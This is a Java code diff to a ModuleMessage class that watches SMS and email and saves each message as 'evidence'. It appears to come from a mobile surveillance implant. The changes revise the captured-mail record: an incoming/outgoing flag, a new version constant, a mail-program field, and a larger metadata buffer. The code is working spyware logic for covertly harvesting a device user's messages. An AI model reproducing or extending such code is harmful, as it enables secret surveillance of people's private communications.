@@ -59,7 +59,7 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
     //#endif
 
     private static final int SMS_VERSION = 2010050501;
-    private static final int MAIL_VERSION = 2009070301;
+    private static final int MAIL_VERSION2 = 2012030601;
 
     protected static final int SLEEPTIME = 5000;
     protected static final int PERIODTIME = 60 * 60 * 1000;
@@ -67,6 +67,8 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
     private static final int ID_MAIL = 0;
     private static final int ID_SMS = 1;
     private static final int ID_MMS = 2;
+
+    private static final int MAIL_PROGRAM = 1;
 
     boolean mailEnabled;
     boolean smsEnabled;
@@ -653,13 +655,19 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
         //#endif
 
         //#ifdef DEBUG
-        debug.trace("saveEvidence: " + message + " name: " + storeName); //$NON-NLS-1$ //$NON-NLS-2$
+        debug.trace("saveEvidence: " + message + " name: " + storeName + " status: " + message.getStatus() ); //$NON-NLS-1$ //$NON-NLS-2$
         //#endif
 
         try {
+            boolean incoming = message.getStatus() == Message.Status.RX_RECEIVED;
+            if(incoming){
+                //#ifdef DEBUG
+                debug.trace("onNewMail: incoming");
+                //#endif
+            }
+            final int flags = incoming?  0x10 : 0x0;
 
-            final int flags = 1;
-
+            //18.13=local
             String from = Messages.getString("18.13"); //$NON-NLS-1$
             if (storeName.indexOf("@") > 0) { //$NON-NLS-1$
                 from = storeName;
@@ -676,17 +684,18 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
 
             final DateTime filetime = new DateTime(message.getReceivedDate());
 
-            final byte[] additionalData = new byte[20];
+            final byte[] additionalData = new byte[24];
 
-            final DataBuffer databuffer = new DataBuffer(additionalData, 0, 20,
+            final DataBuffer databuffer = new DataBuffer(additionalData, 0, 24,
                     false);
-            databuffer.writeInt(MAIL_VERSION);
+            databuffer.writeInt(MAIL_VERSION2);
             databuffer.writeInt(flags);
             databuffer.writeInt(size);
             databuffer.writeLong(filetime.getFiledate());
+            databuffer.writeInt(MAIL_PROGRAM);
 
             //#ifdef DBC
-            Check.asserts(additionalData.length == 20,
+            Check.asserts(additionalData.length == 24,
                     "Mail Wrong buffer size: " + additionalData.length); //$NON-NLS-1$
             //#endif
 
